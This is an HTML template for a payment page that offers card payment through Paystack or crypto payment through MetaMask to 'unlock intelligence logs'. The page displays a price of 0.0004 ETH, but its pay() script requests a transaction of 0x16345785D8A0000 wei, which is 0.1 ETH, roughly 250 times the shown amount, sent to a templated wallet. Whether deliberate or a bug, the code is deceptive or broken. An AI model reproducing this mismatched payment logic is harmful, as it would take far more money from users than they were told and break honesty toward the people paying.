{% extends "base.html" %}
{% block content %}
<div class="glass" style="max-width: 600px; margin: 4rem auto; text-align: center;">
    <h2>Secure <span class="accent">Gateway</span></h2>
    <p style="color: #94a3b8; margin-bottom: 2rem;">Select payment method to unlock intelligence logs.</p>
    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
        <div style="border: 1px solid #1e293b; padding: 20px; border-radius: 12px; background: #020617;">
            <p style="font-size: 0.8rem; color: #94a3b8;">Local Bank / Card</p>
            <h3 style="margin: 10px 0;">â‚¦1,500</h3>
            <a href="{{ paystack }}" target="_blank" style="display: block; background: #4ade80; color: black; padding: 12px; border-radius: 8px; text-decoration: none; font-weight: 700;">PAYSTACK</a>
        </div>
        <div style="border: 1px solid #1e293b; padding: 20px; border-radius: 12px; background: #020617;">
            <p style="font-size: 0.8rem; color: #94a3b8;">Web3 Crypto</p>
            <h3 style="margin: 10px 0;">0.0004 ETH</h3>
            <button onclick="pay()" style="width: 100%; background: var(--accent); border: none; padding: 12px; border-radius: 8px; font-weight: 700; cursor: pointer;">METAMASK</button>
        </div>
    </div>
</div>
<script>
async function pay() {
    if (window.ethereum) {
        const acc = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const tx = { to: '{{ wallet }}', from: acc[0], value: '0x16345785D8A0000' };
        await ethereum.request({ method: 'eth_sendTransaction', params: [tx] });
    } else { alert("Please install MetaMask extension."); }
}
</script>
{% endblock %}
